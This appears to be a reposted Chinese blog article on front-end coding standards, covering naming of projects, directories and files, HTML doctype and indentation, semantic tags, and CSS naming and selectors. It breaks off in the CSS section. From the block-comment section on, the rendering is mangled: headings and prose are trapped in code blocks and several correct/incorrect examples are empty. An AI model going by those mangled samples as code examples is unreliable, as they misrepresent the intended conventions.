        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>目录</p><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E5%A3%B0%E6%98%8E">声明</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83">前端代码规范</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E5%89%8D%E7%AB%AF-js-%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83">前端 JS 项目开发规范</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%B8%80%E3%80%81%E7%BC%96%E7%A8%8B%E8%A7%84%E7%BA%A6">一、编程规约</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%B8%80%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83">(一)命名规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#111-%E9%A1%B9%E7%9B%AE%E5%91%BD%E5%90%8D">1.1.1 项目命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#112-%E7%9B%AE%E5%BD%95%E5%91%BD%E5%90%8D">1.1.2 目录命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#113-js%E3%80%81css%E3%80%81scss%E3%80%81html%E3%80%81png-%E6%96%87%E4%BB%B6%E5%91%BD%E5%90%8D">1.1.3 JS、CSS、SCSS、HTML、PNG 文件命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#114-%E5%91%BD%E5%90%8D%E4%B8%A5%E8%B0%A8%E6%80%A7">1.1.4 命名严谨性</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%BA%8Chtml-%E8%A7%84%E8%8C%83-%EF%BC%88vue-template-%E5%90%8C%E6%A0%B7%E9%80%82%E7%94%A8%EF%BC%89">(二)HTML 规范 （Vue Template 同样适用）</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#121-html-%E7%B1%BB%E5%9E%8B">1.2.1 HTML 类型</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#122-%E7%BC%A9%E8%BF%9B">1.2.2 缩进</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#123-%E5%88%86%E5%9D%97%E6%B3%A8%E9%87%8A">1.2.3 分块注释</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#124-%E8%AF%AD%E4%B9%89%E5%8C%96%E6%A0%87%E7%AD%BE">1.2.4 语义化标签</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#125-%E5%BC%95%E5%8F%B7">1.2.5 引号</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%B8%89-css-%E8%A7%84%E8%8C%83">(三) CSS 规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#131-%E5%91%BD%E5%90%8D">1.3.1 命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#132-%E9%80%89%E6%8B%A9%E5%99%A8">1.3.2 选择器</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#133-%E5%B0%BD%E9%87%8F%E4%BD%BF%E7%94%A8%E7%BC%A9%E5%86%99%E5%B1%9E%E6%80%A7">1.3.3 尽量使用缩写属性</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#134-%E6%AF%8F%E4%B8%AA%E9%80%89%E6%8B%A9%E5%99%A8%E5%8F%8A%E5%B1%9E%E6%80%A7%E7%8B%AC%E5%8D%A0%E4%B8%80%E8%A1%8C">1.3.4 每个选择器及属性独占一行</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#135-%E7%9C%81%E7%95%A50%E5%90%8E%E9%9D%A2%E7%9A%84%E5%8D%95%E4%BD%8D">1.3.5 省略0后面的单位</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#136-%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8id%E9%80%89%E6%8B%A9%E5%99%A8%E5%8F%8A%E5%85%A8%E5%B1%80%E6%A0%87%E7%AD%BE%E9%80%89%E6%8B%A9%E5%99%A8%E9%98%B2%E6%AD%A2%E6%B1%A1%E6%9F%93%E5%85%A8%E5%B1%80%E6%A0%B7%E5%BC%8F">1.3.6 避免使用ID选择器及全局标签选择器防止污染全局样式</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E5%9B%9B-less-%E8%A7%84%E8%8C%83">(四) LESS 规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#141-%E4%BB%A3%E7%A0%81%E7%BB%84%E7%BB%87">1.4.1 代码组织</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1%E5%B0%86%E5%85%AC%E5%85%B1less%E6%96%87%E4%BB%B6%E6%94%BE%E7%BD%AE%E5%9C%A8stylelesscommon%E6%96%87%E4%BB%B6%E5%A4%B9">1)将公共less文件放置在style&#x2F;less&#x2F;common文件夹</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2%E6%8C%89%E4%BB%A5%E4%B8%8B%E9%A1%BA%E5%BA%8F%E7%BB%84%E7%BB%87">2)按以下顺序组织</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#142-%E9%81%BF%E5%85%8D%E5%B5%8C%E5%A5%97%E5%B1%82%E7%BA%A7%E8%BF%87%E5%A4%9A">1.4.2 避免嵌套层级过多</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%BA%94-javascript-%E8%A7%84%E8%8C%83">(五) Javascript 规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#151-%E5%91%BD%E5%90%8D">1.5.1 命名</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-%E9%87%87%E7%94%A8%E5%B0%8F%E5%86%99%E9%A9%BC%E5%B3%B0%E5%91%BD%E5%90%8D-lowercamelcase%EF%BC%8C%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%91%BD%E5%90%8D%E5%9D%87%E4%B8%8D%E8%83%BD%E4%BB%A5%E4%B8%8B%E5%88%92%E7%BA%BF%EF%BC%8C%E4%B9%9F%E4%B8%8D%E8%83%BD%E4%BB%A5%E4%B8%8B%E5%88%92%E7%BA%BF%E6%88%96%E7%BE%8E%E5%85%83%E7%AC%A6%E5%8F%B7%E7%BB%93%E6%9D%9F">1) 采用小写驼峰命名 lowerCamelCase，代码中的命名均不能以下划线，也不能以下划线或美元符号结束</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E6%96%B9%E6%B3%95%E5%90%8D%E3%80%81%E5%8F%82%E6%95%B0%E5%90%8D%E3%80%81%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E3%80%81%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E9%83%BD%E7%BB%9F%E4%B8%80%E4%BD%BF%E7%94%A8-lowercamelcase-%E9%A3%8E%E6%A0%BC%EF%BC%8C%E5%BF%85%E9%A1%BB%E9%81%B5%E4%BB%8E%E9%A9%BC%E5%B3%B0%E5%BD%A2%E5%BC%8F%E3%80%82">2) 方法名、参数名、成员变量、局部变量都统一使用 lowerCamelCase 风格，必须遵从驼峰形式。</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#3-%E5%B8%B8%E9%87%8F%E5%91%BD%E5%90%8D%E5%85%A8%E9%83%A8%E5%A4%A7%E5%86%99%EF%BC%8C%E5%8D%95%E8%AF%8D%E9%97%B4%E7%94%A8%E4%B8%8B%E5%88%92%E7%BA%BF%E9%9A%94%E5%BC%80%EF%BC%8C%E5%8A%9B%E6%B1%82%E8%AF%AD%E4%B9%89%E8%A1%A8%E8%BE%BE%E5%AE%8C%E6%95%B4%E6%B8%85%E6%A5%9A%EF%BC%8C%E4%B8%8D%E8%A6%81%E5%AB%8C%E5%90%8D%E5%AD%97%E9%95%BF%E3%80%82">3) 常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长。</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#152-%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F">1.5.2 代码格式</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-%E4%BD%BF%E7%94%A8-2-%E4%B8%AA%E7%A9%BA%E6%A0%BC%E8%BF%9B%E8%A1%8C%E7%BC%A9%E8%BF%9B">1) 使用 2 个空格进行缩进</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E4%B8%8D%E5%90%8C%E9%80%BB%E8%BE%91%E3%80%81%E4%B8%8D%E5%90%8C%E8%AF%AD%E4%B9%89%E3%80%81%E4%B8%8D%E5%90%8C%E4%B8%9A%E5%8A%A1%E7%9A%84%E4%BB%A3%E7%A0%81%E4%B9%8B%E9%97%B4%E6%8F%92%E5%85%A5%E4%B8%80%E4%B8%AA%E7%A9%BA%E8%A1%8C%E5%88%86%E9%9A%94%E5%BC%80%E6%9D%A5%E4%BB%A5%E6%8F%90%E5%8D%87%E5%8F%AF%E8%AF%BB%E6%80%A7%E3%80%82">2) 不同逻辑、不同语义、不同业务的代码之间插入一个空行分隔开来以提升可读性。</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#153-%E5%AD%97%E7%AC%A6%E4%B8%B2">1.5.3 字符串</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#154-%E5%AF%B9%E8%B1%A1%E5%A3%B0%E6%98%8E">1.5.4 对象声明</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1%E4%BD%BF%E7%94%A8%E5%AD%97%E9%9D%A2%E5%80%BC%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1">1)使用字面值创建对象</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E4%BD%BF%E7%94%A8%E5%AD%97%E9%9D%A2%E9%87%8F%E6%9D%A5%E4%BB%A3%E6%9B%BF%E5%AF%B9%E8%B1%A1%E6%9E%84%E9%80%A0%E5%99%A8">2) 使用字面量来代替对象构造器</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#155-%E4%BD%BF%E7%94%A8-es67">1.5.5 使用 ES6,7</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#156-%E6%8B%AC%E5%8F%B7">1.5.6 括号</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#157-undefined-%E5%88%A4%E6%96%AD">1.5.7 undefined 判断</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#158-%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD%E5%92%8C%E5%BE%AA%E7%8E%AF%E6%9C%80%E5%A4%9A%E4%B8%89%E5%B1%82">1.5.8 条件判断和循环最多三层</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#159-this-%E7%9A%84%E8%BD%AC%E6%8D%A2%E5%91%BD%E5%90%8D">1.5.9 this 的转换命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1510-%E6%85%8E%E7%94%A8-consolelog">1.5.10 慎用 console.log</a></li></ul></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%BA%8C%E3%80%81vue-%E9%A1%B9%E7%9B%AE%E8%A7%84%E8%8C%83">二、Vue 项目规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%B8%80-vue-%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80">(一) Vue 编码基础</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#211-%E7%BB%84%E4%BB%B6%E8%A7%84%E8%8C%83">2.1.1. 组件规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-%E7%BB%84%E4%BB%B6%E5%90%8D%E4%B8%BA%E5%A4%9A%E4%B8%AA%E5%8D%95%E8%AF%8D%E3%80%82">1) 组件名为多个单词。</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E7%BB%84%E4%BB%B6%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BA-pascal-case-%E6%A0%BC%E5%BC%8F">2) 组件文件名为 pascal-case 格式</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#3-%E5%9F%BA%E7%A1%80%E7%BB%84%E4%BB%B6%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BA-base-%E5%BC%80%E5%A4%B4%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%AE%8C%E6%95%B4%E5%8D%95%E8%AF%8D%E8%80%8C%E4%B8%8D%E6%98%AF%E7%BC%A9%E5%86%99%E3%80%82">3) 基础组件文件名为 base 开头，使用完整单词而不是缩写。</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#4-%E5%92%8C%E7%88%B6%E7%BB%84%E4%BB%B6%E7%B4%A7%E5%AF%86%E8%80%A6%E5%90%88%E7%9A%84%E5%AD%90%E7%BB%84%E4%BB%B6%E5%BA%94%E8%AF%A5%E4%BB%A5%E7%88%B6%E7%BB%84%E4%BB%B6%E5%90%8D%E4%BD%9C%E4%B8%BA%E5%89%8D%E7%BC%80%E5%91%BD%E5%90%8D">4) 和父组件紧密耦合的子组件应该以父组件名作为前缀命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#5-%E5%9C%A8-template-%E6%A8%A1%E7%89%88%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6%EF%BC%8C%E5%BA%94%E4%BD%BF%E7%94%A8-pascalcase-%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%B9%B6%E4%B8%94%E4%BD%BF%E7%94%A8%E8%87%AA%E9%97%AD%E5%90%88%E7%BB%84%E4%BB%B6%E3%80%82">5) 在 Template 模版中使用组件，应使用 PascalCase 模式，并且使用自闭合组件。</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#6-%E7%BB%84%E4%BB%B6%E7%9A%84-data-%E5%BF%85%E9%A1%BB%E6%98%AF%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0">6) 组件的 data 必须是一个函数</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#7-prop-%E5%AE%9A%E4%B9%89%E5%BA%94%E8%AF%A5%E5%B0%BD%E9%87%8F%E8%AF%A6%E7%BB%86">7) Prop 定义应该尽量详细</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#8-%E4%B8%BA%E7%BB%84%E4%BB%B6%E6%A0%B7%E5%BC%8F%E8%AE%BE%E7%BD%AE%E4%BD%9C%E7%94%A8%E5%9F%9F">8) 为组件样式设置作用域</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#9-%E5%A6%82%E6%9E%9C%E7%89%B9%E6%80%A7%E5%85%83%E7%B4%A0%E8%BE%83%E5%A4%9A%EF%BC%8C%E5%BA%94%E8%AF%A5%E4%B8%BB%E5%8A%A8%E6%8D%A2%E8%A1%8C%E3%80%82">9) 如果特性元素较多，应该主动换行。</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#212-%E6%A8%A1%E6%9D%BF%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%AE%80%E5%8D%95%E7%9A%84%E8%A1%A8%E8%BE%BE%E5%BC%8F">2.1.2. 模板中使用简单的表达式</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#213-%E6%8C%87%E4%BB%A4%E9%83%BD%E4%BD%BF%E7%94%A8%E7%BC%A9%E5%86%99%E5%BD%A2%E5%BC%8F">2.1.3 指令都使用缩写形式</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#214-%E6%A0%87%E7%AD%BE%E9%A1%BA%E5%BA%8F%E4%BF%9D%E6%8C%81%E4%B8%80%E8%87%B4">2.1.4 标签顺序保持一致</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#215-%E5%BF%85%E9%A1%BB%E4%B8%BA-v-for-%E8%AE%BE%E7%BD%AE%E9%94%AE%E5%80%BC-key">2.1.5 必须为 v-for 设置键值 key</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#216-v-show-%E4%B8%8E-v-if-%E9%80%89%E6%8B%A9">2.1.6 v-show 与 v-if 选择</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#217-script-%E6%A0%87%E7%AD%BE%E5%86%85%E9%83%A8%E7%BB%93%E6%9E%84%E9%A1%BA%E5%BA%8F">2.1.7 script 标签内部结构顺序</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#218-vue-router-%E8%A7%84%E8%8C%83">2.1.8 Vue Router 规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%8F%82%E6%95%B0">1) 页面跳转数据传递使用路由参数</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E6%87%92%E5%8A%A0%E8%BD%BD%EF%BC%88%E5%BB%B6%E8%BF%9F%E5%8A%A0%E8%BD%BD%EF%BC%89%E6%9C%BA%E5%88%B6">2) 使用路由懒加载（延迟加载）机制</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#3-router-%E4%B8%AD%E7%9A%84%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83">3) router 中的命名规范</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#4-router-%E4%B8%AD%E7%9A%84-path-%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83">4) router 中的 path 命名规范</a></li></ul></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%BA%8C-vue-%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E8%A7%84%E8%8C%83">(二) Vue 项目目录规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#221-%E5%9F%BA%E7%A1%80">2.2.1 基础</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#222-%E4%BD%BF%E7%94%A8-vue-cli-%E8%84%9A%E6%89%8B%E6%9E%B6">2.2.2 使用 Vue-cli 脚手架</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#223-%E7%9B%AE%E5%BD%95%E8%AF%B4%E6%98%8E">2.2.3 目录说明</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-api-%E7%9B%AE%E5%BD%95">1) api 目录</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-assets-%E7%9B%AE%E5%BD%95">2) assets 目录</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#3-components-%E7%9B%AE%E5%BD%95">3) components 目录</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#4-constants-%E7%9B%AE%E5%BD%95">4) constants 目录</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#5-router-%E4%B8%8E-store-%E7%9B%AE%E5%BD%95">5) router 与 store 目录</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#6-views-%E7%9B%AE%E5%BD%95">6) views 目录</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#224-%E6%B3%A8%E9%87%8A%E8%AF%B4%E6%98%8E">2.2.4 注释说明</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#225-%E5%85%B6%E4%BB%96">2.2.5 其他</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-%E5%B0%BD%E9%87%8F%E4%B8%8D%E8%A6%81%E6%89%8B%E5%8A%A8%E6%93%8D%E4%BD%9C-dom">1) 尽量不要手动操作 DOM</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E5%88%A0%E9%99%A4%E6%97%A0%E7%94%A8%E4%BB%A3%E7%A0%81">2) 删除无用代码</a></li></ul></li></ul></li></ul></li></ul><p><a name="IACrB"></a></p><h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><blockquote><p>从某位 up 主那里嫖来的，转载一下，留个印象，日后再看，具体地址忘了， ，，后续再补</p></blockquote><p><a name="pa9JL"></a></p><h1 id="前端代码规范"><a href="#前端代码规范" class="headerlink" title="前端代码规范"></a>前端代码规范</h1><p>Front Standard Guide<br><a name="ceipr"></a></p><h1 id="前端-JS-项目开发规范"><a href="#前端-JS-项目开发规范" class="headerlink" title="前端 JS 项目开发规范"></a>前端 JS 项目开发规范</h1><p>规范的目的是为了编写高质量的代码，让你的团队成员每天得心情都是愉悦的，大家在一起是快乐的。<br />引自《阿里规约》的开头片段：<br /><em>—-现代软件架构的复杂性需要协同开发完成，如何高效地协同呢？无规矩不成方圆，无规范难以协同，比如，制订交通法规表面上是要限制行车权，实际上是保障公众的人身安全，试想如果没有限速，没有红绿灯，谁还敢上路行驶。对软件来说，适当的规范和标准绝不是消灭代码内容的创造性、优雅性，而是限制过度个性化，以一种普遍认可的统一方式一起做事，提升协作效率，降低沟通成本。代码的字里行间流淌的是软件系统的血液，质量的提升是尽可能少踩坑，杜绝踩重复的坑，切实提升系统稳定性，码出质量。</em><br><a name="itBp8"></a></p><h1 id="一、编程规约"><a href="#一、编程规约" class="headerlink" title="一、编程规约"></a>一、编程规约</h1><p><a name="YKrNh"></a></p><h3 id="一-命名规范"><a href="#一-命名规范" class="headerlink" title="(一)命名规范"></a>(一)命名规范</h3><p><a name="tQAwT"></a></p><h4 id="1-1-1-项目命名"><a href="#1-1-1-项目命名" class="headerlink" title="1.1.1 项目命名"></a>1.1.1 项目命名</h4><p>全部采用小写方式， 以中划线分隔。<br />正例：<code>mall-management-system</code><br />反例：<code>mall_management-system / mallManagementSystem</code><br><a name="pRoTq"></a></p><h4 id="1-1-2-目录命名"><a href="#1-1-2-目录命名" class="headerlink" title="1.1.2 目录命名"></a>1.1.2 目录命名</h4><p>全部采用小写方式， 以中划线分隔，有复数结构时，要采用复数命名法， 缩写不用复数<br />正例： <code>scripts / styles / components / images / utils / layouts / demo-styles / demo-scripts / img / doc</code><br />反例： <code>script / style / demo_scripts / demoStyles / imgs / docs</code><br />【特殊】VUE 的项目中的 components 中的组件目录，使用 kebab-case 命名<br />正例： <code>head-search / page-loading / authorized / notice-icon</code><br />反例： <code>HeadSearch / PageLoading</code><br />【特殊】VUE 的项目中的除 components 组件目录外的所有目录也使用 kebab-case 命名<br />正例： <code>page-one / shopping-car / user-management</code><br />反例： <code>ShoppingCar / UserManagement</code><br><a name="rddhB"></a></p><h4 id="1-1-3-JS、CSS、SCSS、HTML、PNG-文件命名"><a href="#1-1-3-JS、CSS、SCSS、HTML、PNG-文件命名" class="headerlink" title="1.1.3 JS、CSS、SCSS、HTML、PNG 文件命名"></a>1.1.3 JS、CSS、SCSS、HTML、PNG 文件命名</h4><p>全部采用小写方式， 以中划线分隔<br />正例： <code>render-dom.js / signup.css / index.html / company-logo.png</code><br />反例： <code>renderDom.js / UserManagement.html</code><br><a name="Odhei"></a></p><h4 id="1-1-4-命名严谨性"><a href="#1-1-4-命名严谨性" class="headerlink" title="1.1.4 命名严谨性"></a>1.1.4 命名严谨性</h4><p>代码中的命名严禁使用拼音与英文混合的方式，更不允许直接使用中文的方式。 说明：正确的英文拼写和语法可以让阅读者易于理解，避免歧义。注意，即使纯拼音命名方式也要避免采用<br />正例：<code>henan / luoyang / rmb 等国际通用的名称，可视同英文。</code><br />反例：<code>DaZhePromotion [打折] / getPingfenByName() [评分] / int 某变量 = 3</code><br /><strong>杜绝完全不规范的缩写，避免望文不知义：</strong><br />反例：AbstractClass“缩写”命名成 AbsClass；condition“缩写”命名成 condi，此类随意缩写严重降低了代码的可阅读性。<br><a name="Bif0f"></a></p><h3 id="二-HTML-规范-（Vue-Template-同样适用）"><a href="#二-HTML-规范-（Vue-Template-同样适用）" class="headerlink" title="(二)HTML 规范 （Vue Template 同样适用）"></a>(二)HTML 规范 （Vue Template 同样适用）</h3><p><a name="wviLN"></a></p><h4 id="1-2-1-HTML-类型"><a href="#1-2-1-HTML-类型" class="headerlink" title="1.2.1 HTML 类型"></a>1.2.1 HTML 类型</h4><p>推荐使用 HTML5 的文档类型申明： .<br />（建议使用 text&#x2F;html 格式的 HTML。避免使用 XHTML。XHTML 以及它的属性，比如 application&#x2F;xhtml+xml 在浏览器中的应用支持与优化空间都十分有限）。</p><ul><li>规定字符编码</li><li>IE 兼容模式</li><li>规定字符编码</li><li>doctype 大写</li></ul><p>正例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot; /&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;Page title&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;img src=&quot;images/company-logo.png&quot; alt=&quot;Company&quot; /&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><a name="pyaOp"></a></p><h4 id="1-2-2-缩进"><a href="#1-2-2-缩进" class="headerlink" title="1.2.2 缩进"></a>1.2.2 缩进</h4><p>缩进使用 2 个空格（一个 tab）<br />嵌套的节点应该缩进。<br><a name="KsTsF"></a></p><h4 id="1-2-3-分块注释"><a href="#1-2-3-分块注释" class="headerlink" title="1.2.3 分块注释"></a>1.2.3 分块注释</h4><p>在每一个块状元素，列表元素和表格元素后，加上一对 HTML 注释。注释格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a name=&quot;VlgQK&quot;&gt;&lt;/a&gt;</span><br><span class="line">### 1.2.4 语义化标签</span><br><span class="line">HTML5 中新增很多语义化标签，所以优先使用语义化标签，避免一个页面都是 div 或者 p 标签&lt;br /&gt;正例</span><br></pre></td></tr></table></figure><header></header><footer></footer><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反例</span><br></pre></td></tr></table></figure><div>  <p></p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;a name=&quot;zVtmd&quot;&gt;&lt;/a&gt;</span><br><span class="line">#### 1.2.5 引号</span><br><span class="line">使用双引号(&quot; &quot;) 而不是单引号(’ &#x27;) 。&lt;br /&gt;正例： ``&lt;br /&gt;反例： ``</span><br><span class="line">&lt;a name=&quot;xGJTL&quot;&gt;&lt;/a&gt;</span><br><span class="line">### (三) CSS 规范</span><br><span class="line">&lt;a name=&quot;KfxnO&quot;&gt;&lt;/a&gt;</span><br><span class="line">#### 1.3.1 命名</span><br><span class="line"></span><br><span class="line">- 类名使用小写字母，以中划线分隔</span><br><span class="line">- id 采用驼峰式命名</span><br><span class="line">- scss 中的变量、函数、混合、placeholder 采用驼峰式命名</span><br><span class="line"></span><br><span class="line">ID 和 class 的名称总是使用可以反应元素目的和用途的名称，或其他通用的名称，代替表象和晦涩难懂的名称&lt;br /&gt;不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>.fw-800 {  font-weight: 800;}.red {  color: red;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐:</span><br><span class="line"></span><br></pre></td></tr></table></figure>.heavy {  font-weight: 800;}.important {  color: red;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;wNraB&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.3.2 选择器</span><br><span class="line"></span><br><span class="line">1)css 选择器中避免使用标签名&lt;br /&gt;从结构、表现、行为分离的原则来看，应该尽量避免 css 中出现 HTML 标签，并且在 css 选择器中出现标签名会存在潜在的问题。&lt;br /&gt;2)很多前端开发人员写选择器链的时候不使用 直接子选择器（注：直接子选择器和后代选择器的区别）。有时，这可能会导致疼痛的设计问题并且有时候可能会很耗性能。然而，在任何情况下，这是一个非常不好的做法。如果你不写很通用的，需要匹配到 DOM 末端的选择器， 